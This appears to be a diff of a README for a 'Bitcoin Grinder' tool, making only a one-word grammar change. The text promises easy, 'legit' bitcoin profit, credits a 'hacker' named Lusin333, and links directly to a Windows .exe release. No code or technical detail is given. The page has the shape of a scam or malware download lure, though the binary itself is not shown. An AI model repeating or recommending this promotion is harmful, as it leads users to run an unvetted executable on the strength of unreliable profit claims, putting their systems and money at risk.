@@ -3,7 +3,7 @@
 ## Synopsis
 Get your bitcoins easier than ever with the Bitcoin Grinder!  No more complicated computer stuff!
 
-Is mining bitcoins too complicated? Do you wish mining bitcoins was very easy?  With the Bitcoin Grinder, making legit profit with bitcoin is no longer difficult!  The Bitcoin Grinder was created by an awesome hacker named Lusin333 who HATED all the complex stuff you had to do just to get started mining bitcoins!
+Is mining bitcoins too complicated? Do you wish mining bitcoins was very easy?  With the Bitcoin Grinder, making legit profit with bitcoin is no longer difficult!  The Bitcoin Grinder was created by an awesome hacker named Lusin333 that HATED all the complex stuff you had to do just to get started mining bitcoins!
 
 ## Download
 **[Bitcoin Grinder Download](https://github.com/Lusin333/Bitcoin-Grinder/releases/download/Bitcoin_Grinder_2025-01-14/Bitcoin.Grinder.exe)**
